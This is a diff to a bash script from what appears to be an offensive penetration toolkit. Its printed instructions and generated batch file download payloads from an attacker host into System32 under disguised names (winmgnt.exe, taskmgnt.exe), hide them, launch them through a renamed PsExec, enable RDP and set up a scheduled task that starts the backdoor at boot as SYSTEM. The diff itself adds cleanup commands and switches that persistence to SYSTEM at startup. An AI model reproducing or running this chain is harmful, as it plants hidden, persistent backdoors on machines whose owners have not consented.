@@ -388,7 +388,11 @@ do
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
 		echo ""
-		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec."
+		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec. Run the first 3 delete & kill commands to remove the files first; only if you have already moved them to the target and you wish to re-run this process."
+		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31mtaskkill /F /IM winmgnt.exe\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\winmgnt.exe\"\e[97m\E[1;34m"
+		echo ""
 		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
 		echo ""
 		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
@@ -399,7 +403,7 @@ do
 		echo ""
 		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
 		echo ""
-		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
         echo ""
         echo "INSTRUCTIONS FROM A METERPRETER SHELL:"
         echo -e "\E[1;34m\e[97mmeterpreter > \e[31mupload '/root/ATAT/DBD_reboot.bat' %WINDIR%\\\\\System32\\\\\DBD_reboot.bat\e[97m\E[1;34m"
@@ -445,7 +449,11 @@ do
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
 		echo ""
-		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec."
+		echo "Now move the \"taskmgnt.txt\" & \"winmgnt.txt\" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec. Run the first 3 delete & kill commands to remove the files first; only if you have already moved them to the target and you wish to re-run this process."
+		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\\taskmgnt.exe\"\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31mtaskkill /F /IM winmgnt.exe\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31mdel /A:H \"%WINDIR%\\System32\\winmgnt.exe\"\e[97m\E[1;34m"
+		echo ""
 		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
 		echo ""
 		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
@@ -456,7 +464,7 @@ do
 		echo ""
 		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
 		echo ""
-		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
         echo ""
         echo "INSTRUCTIONS FROM A METERPRETER SHELL:"
         echo -e "\E[1;34m\e[97mmeterpreter > \e[31mupload '/root/ATAT/DBD_reboot.bat' %WINDIR%\\\\\System32\\\\\DBD_reboot.bat\e[97m\E[1;34m"
@@ -542,12 +550,15 @@ do
 	    "DBD Reboot Persistence Generator - Windows")
         read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost;
 			touch  ~/ATAT/DBD_reboot.bat
-			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/winmgnt.txt\',\'%WINDIR%\\System32\\winmgnt.exe\'\) > ~/ATAT/DBD_reboot.bat
+			echo del /A:H \"%WINDIR%\\System32\\taskmgnt.exe\" > ~/ATAT/DBD_reboot.bat
+			echo taskkill /F /IM winmgnt.exe >> ~/ATAT/DBD_reboot.bat
+			echo del /A:H \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
+			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/winmgnt.txt\',\'%WINDIR%\\System32\\winmgnt.exe\'\) >> ~/ATAT/DBD_reboot.bat
 			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/taskmgnt.txt\',\'%WINDIR%\\System32\\taskmgnt.exe\'\) >> ~/ATAT/DBD_reboot.bat
 			echo attrib +H +S \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
 			echo attrib +H +S \"%WINDIR%\\System32\\\taskmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
 			echo %WINDIR%\\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\\System32\\winmgnt.exe >> ~/ATAT/DBD_reboot.bat
-			echo schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
+			echo schtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
             echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device in %WINDIR%\System32\ and run from a SYSTEM shell in that same directory.\E[1;34m:::::" 
             ;; 
         "Android")
